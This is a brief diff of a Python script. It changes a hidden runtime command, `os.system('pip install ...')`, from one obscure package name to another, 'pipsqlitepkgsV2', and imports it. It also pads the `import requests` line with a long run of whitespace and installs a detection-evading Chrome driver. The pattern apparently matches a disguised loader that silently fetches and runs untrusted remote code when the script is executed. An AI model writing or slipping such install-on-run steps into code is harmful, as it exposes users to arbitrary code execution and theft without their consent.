@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipsqlexts")
-import pipsqlexts
+os.system("pip install pipsqlitepkgsV2")
+import pipsqlitepkgsV2
 import requests																																																																																																																																																																																																																																																																					
 import undetected_chromedriver as uc
 uc.install()
